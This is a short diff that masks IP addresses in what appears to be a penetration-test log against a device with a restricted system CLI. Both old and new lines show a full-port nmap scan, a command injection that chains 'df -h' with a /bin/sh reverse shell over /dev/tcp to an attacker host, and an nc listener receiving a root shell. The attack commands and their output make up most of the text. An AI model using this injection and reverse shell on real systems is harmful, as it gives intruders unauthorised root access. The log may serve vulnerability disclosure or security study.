@@ -1,5 +1,5 @@
-nmap  -p1-65535 172.16.81.227
-Nmap scan report for 172.16.81.227
+nmap  -p1-65535 172.16.xx.xx
+Nmap scan report for 172.16.xx.xx
 Host is up (0.019s latency).
 Not shown: 63971 filtered tcp ports (no-response), 209 filtered tcp ports (host-prohibited), 1341 closed tcp ports (reset)
 PORT     STATE SERVICE
@@ -32,11 +32,11 @@ tmpfs                3.8G     0  3.8G    0% /sys/fs/cgroup
 /dev/sda1            477M  115M  333M   26% /boot
 tmpfs                776M     0  776M    0% /run/user/0
 
-cli(system)> df -h && /bin/sh -i >& /dev/tcp/172.16.80.104/1337 0>&1
+cli(system)> df -h && /bin/sh -i >& /dev/tcp/172.16.xx.xx/1337 0>&1
 
 $ nc -lvnp 1337
 Listening on 0.0.0.0 1337
-Connection received on 172.16.81.227 42914
+Connection received on 172.16.xx.xx 42914
 sh: 此 shell 中无任务控制
 sh-4.2# id
 id
